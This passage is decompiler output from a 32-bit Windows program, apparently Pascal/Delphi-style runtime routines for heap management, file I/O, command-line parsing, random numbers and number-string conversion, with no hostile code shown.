                    // WARNING: Could not recover jumptable at 0x004010d8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle(hObject);
  return BVar1;
}



HANDLE __stdcall
CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
           LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
           DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010e0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
  return pvVar1;
}



DWORD __stdcall GetFileType(HANDLE hFile)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010e8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileType(hFile);
  return DVar1;
}



void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)

{
                    // WARNING: Could not recover jumptable at 0x004010f0. Too many branches
                    // WARNING: Treating indirect jump as call
  GetSystemTime(lpSystemTime);
  return;
}



DWORD __stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010f8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileSize(hFile,lpFileSizeHigh);
  return DVar1;
}



HANDLE __stdcall GetStdHandle(DWORD nStdHandle)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401100. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GetStdHandle(nStdHandle);
  return pvVar1;
}



BOOL __stdcall
ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401110. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
  return BVar1;
}



BOOL __stdcall SetEndOfFile(HANDLE hFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401120. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEndOfFile(hFile);
  return BVar1;
}



DWORD __stdcall
SetFilePointer(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401128. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = SetFilePointer(hFile,lDistanceToMove,lpDistanceToMoveHigh,dwMoveMethod);
  return DVar1;
}



LONG __stdcall UnhandledExceptionFilter(_EXCEPTION_POINTERS *ExceptionInfo)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401130. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = UnhandledExceptionFilter(ExceptionInfo);
  return LVar1;
}



BOOL __stdcall
WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,
         LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401138. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = WriteFile(hFile,lpBuffer,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
  return BVar1;
}



LPSTR __stdcall CharNextA(LPCSTR lpsz)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401140. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = CharNextA(lpsz);
  return pCVar1;
}



HANDLE __stdcall
CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,
            LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,
            LPDWORD lpThreadId)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401148. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateThread(lpThreadAttributes,dwStackSize,lpStartAddress,lpParameter,dwCreationFlags,
                        lpThreadId);
  return pvVar1;
}



void __stdcall ExitProcess(UINT uExitCode)

{
                    // WARNING: Could not recover jumptable at 0x00401150. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  ExitProcess(uExitCode);
  return;
}



DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401158. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



int __stdcall
MultiByteToWideChar(UINT CodePage,DWORD dwFlags,LPCSTR lpMultiByteStr,int cbMultiByte,
                   LPWSTR lpWideCharStr,int cchWideChar)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401160. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MultiByteToWideChar(CodePage,dwFlags,lpMultiByteStr,cbMultiByte,lpWideCharStr,cchWideChar)
  ;
  return iVar1;
}



int __stdcall
WideCharToMultiByte(UINT CodePage,DWORD dwFlags,LPCWSTR lpWideCharStr,int cchWideChar,
                   LPSTR lpMultiByteStr,int cbMultiByte,LPCSTR lpDefaultChar,
                   LPBOOL lpUsedDefaultChar)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401168. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = WideCharToMultiByte(CodePage,dwFlags,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  return iVar1;
}



INT __stdcall SysReAllocStringLen(BSTR *pbstr,OLECHAR *psz,uint len)

{
  INT IVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401170. Too many branches
                    // WARNING: Treating indirect jump as call
  IVar1 = SysReAllocStringLen(pbstr,psz,len);
  return IVar1;
}



void __stdcall SysFreeString(BSTR bstrString)

{
                    // WARNING: Could not recover jumptable at 0x00401178. Too many branches
                    // WARNING: Treating indirect jump as call
  SysFreeString(bstrString);
  return;
}



DWORD __stdcall GetCurrentThreadId(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401180. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentThreadId();
  return DVar1;
}



void FUN_00401188(SIZE_T param_1)

{
  HeapAlloc(DAT_0040b598,DAT_00409044,param_1);
  return;
}



bool FUN_0040119c(LPVOID param_1)

{
  BOOL BVar1;
  
  BVar1 = HeapFree(DAT_0040b598,DAT_00409044 & 1,param_1);
  return BVar1 == 0;
}



void FUN_004011c0(LPVOID param_1,SIZE_T param_2)

{
  HeapReAlloc(DAT_0040b598,0,param_1,param_2);
  return;
}



void FUN_004011d8(int param_1)

{
  int iVar1;
  
  if (param_1 != 0) {
    iVar1 = (*(code *)PTR_FUN_00409048)();
    if (iVar1 == 0) {
      FUN_004012b0(1);
      return;
    }
  }
  return;
}



void FUN_004011f0(int param_1)

{
  int iVar1;
  
  if (param_1 != 0) {
    iVar1 = (*(code *)PTR_FUN_0040904c)();
    if (iVar1 != 0) {
      FUN_004012b0(CONCAT31((int3)((uint)iVar1 >> 8),2));
      return;
    }
  }
  return;
}



void FUN_00401208(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    if (param_2 == 0) {
      *param_1 = 0;
      iVar1 = (*(code *)PTR_FUN_0040904c)(iVar1);
      if (iVar1 == 0) {
        return;
      }
      FUN_004012b0(CONCAT31((int3)((uint)iVar1 >> 8),2));
      return;
    }
    iVar1 = (*(code *)PTR_FUN_00409050)(iVar1);
    if (iVar1 != 0) {
      *param_1 = iVar1;
      return;
    }
LAB_00401239:
    FUN_004012b0(CONCAT31((int3)((uint)iVar1 >> 8),1));
    return;
  }
  if (param_2 != 0) {
    iVar1 = (*(code *)PTR_FUN_00409048)(param_2);
    if (iVar1 == 0) goto LAB_00401239;
    *param_1 = iVar1;
  }
  return;
}



void FUN_00401258(undefined4 param_1,undefined4 param_2)

{
  DAT_00409004 = param_2;
  FUN_004025f8(param_1);
  return;
}



void FUN_00401264(uint param_1,undefined4 param_2)

{
  LPVOID pvVar1;
  uint uVar2;
  
  uVar2 = param_1 & 0xffffff7f;
  if (DAT_0040b008 != (code *)0x0) {
    (*DAT_0040b008)(uVar2,param_2);
  }
  if ((byte)uVar2 == 0) {
    pvVar1 = FUN_00403598();
    uVar2 = *(uint *)((int)pvVar1 + 4);
  }
  else if ((byte)uVar2 < 0x19) {
    uVar2 = (uint)(byte)(&DAT_00409054)[param_1 & 0x7f];
  }
  FUN_00401258(uVar2 & 0xff,param_2);
  return;
}



void FUN_004012b0(uint param_1)

{
  undefined4 in_stack_00000000;
  
  FUN_00401264(param_1 & 0x7f,in_stack_00000000);
  return;
}



void FUN_004012dc(undefined4 param_1)

{
  LPVOID pvVar1;
  
  pvVar1 = FUN_00403598();
  *(undefined4 *)((int)pvVar1 + 4) = param_1;
  return;
}



void FUN_004012ec(void)

{
  DWORD DVar1;
  
  DVar1 = GetLastError();
  FUN_004012dc(DVar1);
  return;
}



undefined4 FUN_004012f8(void)

{
  undefined4 uVar1;
  LPVOID pvVar2;
  
  pvVar2 = FUN_00403598();
  uVar1 = *(undefined4 *)((int)pvVar2 + 4);
  pvVar2 = FUN_00403598();
  *(undefined4 *)((int)pvVar2 + 4) = 0;
  return uVar1;
}



void FUN_00401318(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined4 *puVar5;
  undefined *puVar6;
  byte bVar7;
  
  bVar7 = 0;
  if ((int)param_3 < 4) {
    if ((short)param_3 == 0) {
      return;
    }
    if (param_1 == param_2) {
      return;
    }
    puVar5 = param_1;
    if (param_1 <= param_2) {
      bVar7 = 1;
      puVar5 = (undefined4 *)((int)param_3 + -1 + (int)param_1);
      param_2 = (undefined4 *)((int)param_3 + -1 + (int)param_2);
    }
    for (; param_3 != (undefined4 *)0x0; param_3 = (undefined4 *)((int)param_3 + -1)) {
      *(undefined *)param_2 = *(undefined *)puVar5;
      puVar5 = (undefined4 *)((int)puVar5 + (uint)bVar7 * -2 + 1);
      param_2 = (undefined4 *)((int)param_2 + (uint)bVar7 * -2 + 1);
    }
    iVar3 = 0;
  }
  else {
    if (param_1 == param_2) {
      return;
    }
    puVar1 = param_3;
    if (param_2 < param_1) goto LAB_00401367;
    puVar4 = (undefined *)((int)param_3 + -1 + (int)param_1);
    puVar6 = (undefined *)((int)param_3 + -1 + (int)param_2);
    for (uVar2 = (uint)param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar6 = *puVar4;
      puVar4 = puVar4 + -1;
      puVar6 = puVar6 + -1;
    }
    param_1 = (undefined4 *)0x3;
    puVar5 = (undefined4 *)(puVar4 + -3);
    param_2 = (undefined4 *)(puVar6 + -3);
    for (iVar3 = (int)param_3 >> 2; iVar3 != 0; iVar3 = iVar3 + -1) {
      *param_2 = *puVar5;
      puVar5 = puVar5 + -1;
      param_2 = param_2 + -1;
    }
  }
  param_3 = (undefined4 *)(iVar3 + -1);
  puVar1 = param_1;
  param_1 = puVar5;
LAB_00401367:
  iVar3 = (int)param_3 >> 2;
  if (-1 < iVar3) {
    for (; iVar3 != 0; iVar3 = iVar3 + -1) {
      *param_2 = *param_1;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    }
    for (uVar2 = (uint)puVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_2 = *(undefined *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
  }
  return;
}



byte * FUN_00401378(byte *param_1,int *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined4 *puVar4;
  int iVar5;
  
  while( true ) {
    for (; (*param_1 != 0 && (*param_1 < 0x21)); param_1 = (byte *)CharNextA((LPCSTR)param_1)) {
    }
    if ((*param_1 != 0x22) || (param_1[1] != 0x22)) break;
    param_1 = param_1 + 2;
  }
  puVar4 = (undefined4 *)0x0;
  pbVar3 = param_1;
  while (0x20 < *pbVar3) {
    if (*pbVar3 == 0x22) {
      pbVar3 = (byte *)CharNextA((LPCSTR)pbVar3);
      while ((*pbVar3 != 0 && (*pbVar3 != 0x22))) {
        pbVar2 = (byte *)CharNextA((LPCSTR)pbVar3);
        puVar4 = (undefined4 *)((int)puVar4 + ((int)pbVar2 - (int)pbVar3));
        pbVar3 = pbVar2;
      }
      if (*pbVar3 != 0) {
        pbVar3 = (byte *)CharNextA((LPCSTR)pbVar3);
      }
    }
    else {
      pbVar2 = (byte *)CharNextA((LPCSTR)pbVar3);
      puVar4 = (undefined4 *)((int)puVar4 + ((int)pbVar2 - (int)pbVar3));
      pbVar3 = pbVar2;
    }
  }
  FUN_00402cac(param_2,puVar4);
  iVar1 = *param_2;
  iVar5 = 0;
  while (0x20 < *param_1) {
    if (*param_1 == 0x22) {
      param_1 = (byte *)CharNextA((LPCSTR)param_1);
      while ((*param_1 != 0 && (*param_1 != 0x22))) {
        pbVar3 = (byte *)CharNextA((LPCSTR)param_1);
        for (; param_1 < pbVar3; param_1 = param_1 + 1) {
          *(byte *)(iVar1 + iVar5) = *param_1;
          iVar5 = iVar5 + 1;
        }
      }
      if (*param_1 != 0) {
        param_1 = (byte *)CharNextA((LPCSTR)param_1);
      }
    }
    else {
      pbVar3 = (byte *)CharNextA((LPCSTR)param_1);
      for (; param_1 < pbVar3; param_1 = param_1 + 1) {
        *(byte *)(iVar1 + iVar5) = *param_1;
        iVar5 = iVar5 + 1;
      }
    }
  }
  return param_1;
}



void FUN_00401464(int param_1,int *param_2)

{
  undefined4 *puVar1;
  byte *pbVar2;
  undefined4 local_114 [66];
  
  FUN_0040268c(param_2);
  if (param_1 == 0) {
    puVar1 = (undefined4 *)GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_114,0x105);
    FUN_00402778(param_2,local_114,puVar1);
  }
  else {
    pbVar2 = (byte *)GetCommandLineA();
    while( true ) {
      pbVar2 = FUN_00401378(pbVar2,param_2);
      if ((param_1 == 0) || (*param_2 == 0)) break;
      param_1 = param_1 + -1;
    }
  }
  return;
}



void FUN_004014c4(void)

{
  _SYSTEMTIME local_1c;
  
  GetSystemTime(&local_1c);
  DAT_00409008 = (CONCAT22((short)((uint)local_1c.wHour * 0x3c >> 0x10),
                           (short)((uint)local_1c.wHour * 0x3c) + local_1c.wMinute) * 0x3c +
                 (uint)local_1c.wSecond) * 1000 + (uint)local_1c.wMilliseconds;
  return;
}



int FUN_00401500(undefined *param_1,undefined2 param_2)

{
  ushort uVar1;
  int iVar2;
  
  uVar1 = *(ushort *)(param_1 + 4);
  if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {
    iVar2 = 0x66;
  }
  else {
    if (uVar1 != 0xd7b0) {
      FUN_0040192c(param_1);
    }
    *(undefined2 *)(param_1 + 4) = param_2;
    if ((param_1[0x48] == '\0') && (*(int *)(param_1 + 0x18) == 0)) {
      *(code **)(param_1 + 0x18) = FUN_00401610;
    }
    iVar2 = (**(code **)(param_1 + 0x18))(param_1);
  }
  if (iVar2 != 0) {
    FUN_004012dc(iVar2);
  }
  return iVar2;
}



void FUN_00401558(undefined *param_1)

{
  FUN_00401500(param_1,0xd7b2);
  return;
}



undefined4 FUN_004015e0(HANDLE param_1)

{
  BOOL BVar1;
  
  BVar1 = CloseHandle(param_1);
  return CONCAT31((int3)((uint)(BVar1 + -1) >> 8),BVar1 + -1 == 0);
}



DWORD FUN_004015f0(HANDLE *param_1)

{
  undefined4 uVar1;
  DWORD DVar2;
  
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  uVar1 = FUN_004015e0(*param_1);
  if ((char)uVar1 == '\0') {
    DVar2 = GetLastError();
    return DVar2;
  }
  return 0;
}



DWORD FUN_00401610(HANDLE *param_1)

{
  DWORD DVar1;
  HANDLE pvVar2;
  LONG lDistanceToMove;
  BOOL BVar3;
  uint uVar4;
  DWORD dwCreationDisposition;
  uint uVar5;
  
  param_1[3] = (HANDLE)0x0;
  param_1[4] = (HANDLE)0x0;
  uVar5 = (uint)*(ushort *)(param_1 + 1);
  if (uVar5 == 0xd7b1) {
    DVar1 = 0x80000000;
    dwCreationDisposition = 3;
    param_1[7] = &LAB_00401564;
  }
  else {
    if (uVar5 == 0xd7b2) {
      DVar1 = 0x40000000;
      dwCreationDisposition = 2;
    }
    else {
      if (uVar5 - 0xd7b3 != 0) {
        return uVar5 - 0xd7b3;
      }
      DVar1 = 0xc0000000;
      dwCreationDisposition = 3;
    }
    param_1[7] = &LAB_004015a4;
  }
  param_1[9] = FUN_004015f0;
  param_1[8] = &LAB_004015a0;
  if (*(char *)(param_1 + 0x12) == '\0') {
    param_1[2] = (HANDLE)0x80;
    param_1[9] = &LAB_004015a0;
    param_1[5] = param_1 + 0x53;
    if (*(short *)(param_1 + 1) == -0x284e) {
      if (param_1 == (HANDLE *)&DAT_0040b3c8) {
        DVar1 = 0xfffffff4;
      }
      else {
        DVar1 = 0xfffffff5;
      }
    }
    else {
      DVar1 = 0xfffffff6;
    }
    pvVar2 = GetStdHandle(DVar1);
    if (pvVar2 != (HANDLE)0xffffffff) {
      *param_1 = pvVar2;
LAB_00401777:
      if (*(short *)(param_1 + 1) != -0x284f) {
        DVar1 = GetFileType(*param_1);
        if (DVar1 == 0) {
          CloseHandle(*param_1);
          *(undefined2 *)(param_1 + 1) = 0xd7b0;
          return 0x69;
        }
        if (DVar1 == 2) {
          param_1[8] = &LAB_004015a4;
        }
      }
      return 0;
    }
  }
  else {
    pvVar2 = CreateFileA((LPCSTR)(param_1 + 0x12),DVar1,1,(LPSECURITY_ATTRIBUTES)0x0,
                         dwCreationDisposition,0x80,(HANDLE)0x0);
    if (pvVar2 != (HANDLE)0xffffffff) {
      *param_1 = pvVar2;
      if (*(short *)(param_1 + 1) != -0x284d) goto LAB_00401777;
      *(short *)(param_1 + 1) = *(short *)(param_1 + 1) + -1;
      DVar1 = GetFileSize(*param_1,(LPDWORD)0x0);
      if (DVar1 != 0xffffffff) {
        lDistanceToMove = DVar1 - 0x80;
        if (DVar1 + 1 < 0x81) {
          lDistanceToMove = 0;
        }
        DVar1 = SetFilePointer(*param_1,lDistanceToMove,(PLONG)0x0,0);
        if (DVar1 != 0xffffffff) {
          uVar5 = 0;
          BVar3 = ReadFile(*param_1,param_1 + 0x53,0x80,(LPDWORD)&stack0xfffffff8,(LPOVERLAPPED)0x0)
          ;
          if (BVar3 == 1) {
            for (uVar4 = 0; uVar4 < uVar5; uVar4 = uVar4 + 1) {
              if (*(char *)((int)param_1 + uVar4 + 0x14c) == '\x0e') {
                DVar1 = SetFilePointer(*param_1,uVar4 - uVar5,(PLONG)0x0,2);
                if ((DVar1 == 0xffffffff) || (BVar3 = SetEndOfFile(*param_1), BVar3 != 1))
                goto LAB_004017ae;
                break;
              }
            }
            goto LAB_00401777;
          }
        }
      }
    }
  }
LAB_004017ae:
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  DVar1 = GetLastError();
  return DVar1;
}



undefined4 FUN_004017bc(undefined4 *param_1,undefined *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  
  FUN_004019d0(param_1,0x14c,0);
  param_1[5] = param_1 + 0x53;
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  *(ushort *)((int)param_1 + 6) = (ushort)DAT_0040901c;
  param_1[2] = 0x80;
  param_1[6] = FUN_00401610;
  puVar1 = (undefined4 *)FUN_0040292c((int)param_2);
  puVar2 = (undefined4 *)FUN_00402b24(param_2);
  FUN_00401318(puVar2,param_1 + 0x12,puVar1);
  iVar3 = FUN_0040292c((int)param_2);
  *(undefined *)((int)param_1 + iVar3 + 0x48) = 0;
  return 0;
}



uint FUN_00401880(undefined4 *param_1,undefined4 param_2,uint param_3,undefined4 param_4,
                 undefined *param_5,uint param_6,uint *param_7)

{
  int iVar1;
  DWORD DVar2;
  uint local_8;
  
  local_8 = param_3;
  if (param_6 == (*(ushort *)(param_1 + 1) & param_6)) {
    iVar1 = (*(code *)param_5)(*param_1,(int)((ulonglong)
                                              ((longlong)(int)param_1[2] * (longlong)(int)param_3)
                                             >> 0x20),param_3,*param_1,param_2,
                               (int)((longlong)(int)param_1[2] * (longlong)(int)param_3),&local_8,0)
    ;
    if (iVar1 == 0) {
      DVar2 = GetLastError();
      FUN_004012dc(DVar2);
      local_8 = 0;
    }
    else {
      local_8 = local_8 / (uint)param_1[2];
      if (param_7 == (uint *)0x0) {
        if (param_3 != local_8) {
          FUN_004012dc(param_4);
          local_8 = 0;
        }
      }
      else {
        *param_7 = local_8;
      }
    }
  }
  else {
    FUN_004012dc(0x67);
    local_8 = 0;
  }
  return local_8;
}



void FUN_0040190c(undefined4 *param_1,undefined4 param_2,uint param_3,uint *param_4)

{
  FUN_00401880(param_1,param_2,param_3,0x65,&DAT_00401878,0xd7b2,param_4);
  return;
}



int FUN_0040192c(undefined *param_1)

{
  ushort uVar1;
  int iVar2;
  
  iVar2 = 0;
  uVar1 = *(ushort *)(param_1 + 4);
  if ((uVar1 < 0xd7b1) || (0xd7b3 < uVar1)) {
    if (param_1 != &DAT_0040b030) {
      FUN_004012dc(0x67);
    }
  }
  else {
    if ((uVar1 & 0xd7b2) == 0xd7b2) {
      iVar2 = (**(code **)(param_1 + 0x1c))(param_1);
    }
    if (iVar2 == 0) {
      iVar2 = (**(code **)(param_1 + 0x24))(param_1);
    }
    if (iVar2 != 0) {
      FUN_004012dc(iVar2);
    }
  }
  return iVar2;
}



uint FUN_00401984(HANDLE *param_1)

{
  DWORD DVar1;
  uint uVar2;
  
  uVar2 = 0xffffffff;
  if ((*(ushort *)(param_1 + 1) < 0xd7b1) || (0xd7b3 < *(ushort *)(param_1 + 1))) {
    FUN_004012dc(0x67);
  }
  else {
    DVar1 = GetFileSize(*param_1,(LPDWORD)0x0);
    if (DVar1 == 0xffffffff) {
      FUN_004012ec();
      uVar2 = 0xffffffff;
    }
    else {
      uVar2 = DVar1 / (uint)param_1[2];
    }
  }
  return uVar2;
}



void FUN_004019d0(undefined4 *param_1,uint param_2,undefined param_3)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = (int)param_2 >> 2;
  if (-1 < iVar1) {
    for (; iVar1 != 0; iVar1 = iVar1 + -1) {
      *param_1 = CONCAT22(CONCAT11(param_3,param_3),CONCAT11(param_3,param_3));
      param_1 = param_1 + 1;
    }
    for (uVar2 = param_2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_1 = param_3;
      param_1 = (undefined4 *)((int)param_1 + 1);
    }
  }
  return;
}



undefined4 FUN_004019f0(uint param_1)

{
  DAT_00409008 = DAT_00409008 * 0x8088405 + 1;
  return (int)((ulonglong)param_1 * (ulonglong)DAT_00409008 >> 0x20);
}



void FUN_00401a34(HANDLE *param_1,HANDLE param_2,int param_3)

{
  int iVar1;
  DWORD dwDesiredAccess;
  HANDLE pvVar2;
  DWORD DVar3;
  DWORD dwCreationDisposition;
  
  if (*(ushort *)(param_1 + 1) != 0xd7b0) {
    if (3 < *(ushort *)(param_1 + 1) - 0xd7b0) {
      DVar3 = 0x66;
      goto LAB_00401b08;
    }
    iVar1 = (*(code *)param_1[9])();
    if (iVar1 != 0) {
      FUN_004012dc(iVar1);
    }
  }
  *(undefined2 *)(param_1 + 1) = 0xd7b3;
  param_1[2] = param_2;
  param_1[9] = &LAB_00401a0c;
  param_1[7] = &LAB_004015a0;
  if (*(char *)(param_1 + 0x12) == '\0') {
    param_1[9] = &LAB_004015a0;
    if (param_3 == 3) {
      DVar3 = 0xfffffff5;
    }
    else {
      DVar3 = 0xfffffff6;
    }
    pvVar2 = GetStdHandle(DVar3);
  }
  else {
    dwDesiredAccess = 0xc0000000;
    DVar3 = *(DWORD *)(&DAT_00409070 + ((DAT_0040900c & 0x70) >> 2));
    dwCreationDisposition = 2;
    if ((param_3 != 3) && (dwCreationDisposition = 3, param_3 != 2)) {
      dwDesiredAccess = 0x40000000;
      *(undefined2 *)(param_1 + 1) = 0xd7b2;
      if (param_3 != 1) {
        dwDesiredAccess = 0x80000000;
        *(undefined2 *)(param_1 + 1) = 0xd7b1;
      }
    }
    pvVar2 = CreateFileA((LPCSTR)(param_1 + 0x12),dwDesiredAccess,DVar3,(LPSECURITY_ATTRIBUTES)0x0,
                         dwCreationDisposition,0x80,(HANDLE)0x0);
  }
  if (pvVar2 != (HANDLE)0xffffffff) {
    *param_1 = pvVar2;
    return;
  }
  *(undefined2 *)(param_1 + 1) = 0xd7b0;
  DVar3 = GetLastError();
LAB_00401b08:
  FUN_004012dc(DVar3);
  return;
}



void FUN_00401b14(HANDLE *param_1,HANDLE param_2)

{
  byte bVar1;
  
  bVar1 = DAT_0040900c & 3;
  if (2 < bVar1) {
    bVar1 = 2;
  }
  FUN_00401a34(param_1,param_2,(uint)bVar1);
  return;
}



void FUN_00401b30(HANDLE *param_1,int param_2)

{
  DWORD DVar1;
  
  if (2 < *(ushort *)(param_1 + 1) - 0xd7b1) {
    FUN_004012dc(0x67);
    return;
  }
  DVar1 = SetFilePointer(*param_1,(int)param_1[2] * param_2,(PLONG)0x0,0);
  if (DVar1 != 0xffffffff) {
    return;
  }
  DVar1 = GetLastError();
  FUN_004012dc(DVar1);
  return;
}



void FUN_00401b64(uint param_1,int param_2,char *param_3)

{
  ulonglong uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  char *pcVar5;
  char acStack_25 [21];
  int local_10;
  
  local_10 = param_2;
  uVar2 = (param_1 ^ (int)param_1 >> 0x1f) - ((int)param_1 >> 0x1f);
  iVar4 = 0;
  do {
    iVar3 = iVar4;
    uVar1 = (ulonglong)uVar2;
    uVar2 = uVar2 / 10;
    acStack_25[iVar3 + 1] = (char)(uVar1 % 10) + '0';
    iVar4 = iVar3 + 1;
  } while (uVar2 != 0);
  if ((int)param_1 < 0) {
    acStack_25[iVar3 + 2] = '-';
    iVar4 = iVar3 + 2;
  }
  *param_3 = (char)iVar4;
  pcVar5 = param_3 + 1;
  if (0xff < local_10) {
    local_10 = 0xff;
  }
  iVar3 = local_10 - iVar4;
  if (iVar3 != 0 && iVar4 <= local_10) {
    *param_3 = *param_3 + (char)iVar3;
    for (; iVar3 != 0; iVar3 = iVar3 + -1) {
      *pcVar5 = ' ';
      pcVar5 = pcVar5 + 1;
    }
  }
  do {
    *pcVar5 = acStack_25[iVar4];
    pcVar5 = pcVar5 + 1;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  return;
}



void FUN_00401bc4(uint param_1,char *param_2)

{
  FUN_00401b64(param_1,0,param_2);
  return;
}



void FUN_00401bd0(HANDLE *param_1)

{
  BOOL BVar1;
  
  if (2 < *(ushort *)(param_1 + 1) - 0xd7b1) {
    FUN_004012dc(0x67);
    return;
  }
  BVar1 = SetEndOfFile(*param_1);
  if (BVar1 != 1) {
    FUN_004012ec();
    return;
  }
  return;
}



void FUN_00401bfc(byte *param_1,int *param_2)

{
  bool bVar1;
  uint uVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  byte *pbVar6;
  int iVar7;
  
  pbVar6 = param_1;
  if (param_1 == (byte *)0x0) {
LAB_00401c72:
    pbVar6 = pbVar6 + 1;
  }
  else {
    uVar2 = 0;
    do {
      pbVar5 = pbVar6;
      bVar3 = *pbVar5;
      pbVar6 = pbVar5 + 1;
    } while (bVar3 == 0x20);
    bVar1 = false;
    if (bVar3 != 0x2d) {
      if (bVar3 == 0x2b) goto LAB_00401c82;
      if (((bVar3 != 0x24) && (bVar3 != 0x78)) && (bVar3 != 0x58)) {
        if (bVar3 == 0x30) {
          bVar3 = *pbVar6;
          pbVar6 = pbVar5 + 2;
          if ((bVar3 != 0x78) && (bVar3 != 0x58)) goto joined_r0x00401c46;
          goto LAB_00401c87;
        }
        goto LAB_00401c4a;
      }
LAB_00401c87:
      bVar3 = *pbVar6;
      pbVar6 = pbVar6 + 1;
      if (bVar3 == 0) goto LAB_00401c72;
      do {
        if (0x60 < bVar3) {
          bVar3 = bVar3 - 0x20;
        }
        bVar4 = bVar3 - 0x30;
        if (9 < bVar4) {
          if (5 < (byte)(bVar3 + 0xbf)) goto LAB_00401c7b;
          bVar4 = bVar3 - 0x37;
        }
        if (0xfffffff < uVar2) goto LAB_00401c7b;
        uVar2 = uVar2 * 0x10 + (uint)bVar4;
        bVar3 = *pbVar6;
        pbVar6 = pbVar6 + 1;
      } while (bVar3 != 0);
      goto LAB_00401cbe;
    }
    bVar1 = true;
LAB_00401c82:
    bVar3 = *pbVar6;
    pbVar6 = pbVar5 + 2;
LAB_00401c4a:
    if (bVar3 != 0) {
      do {
        if ((9 < (byte)(bVar3 - 0x30)) || (0xccccccc < uVar2)) goto LAB_00401c7b;
        uVar2 = uVar2 * 10 + (uint)(byte)(bVar3 - 0x30);
        bVar3 = *pbVar6;
        pbVar6 = pbVar6 + 1;
joined_r0x00401c46:
      } while (bVar3 != 0);
      if (bVar1) {
        if ((-1 < (int)uVar2) || (0 < (int)uVar2)) goto LAB_00401cbe;
      }
      else if (-1 < (int)uVar2) {
LAB_00401cbe:
        iVar7 = 0;
        goto LAB_00401cc1;
      }
    }
  }
LAB_00401c7b:
  iVar7 = (int)pbVar6 - (int)param_1;
LAB_00401cc1:
  *param_2 = iVar7;
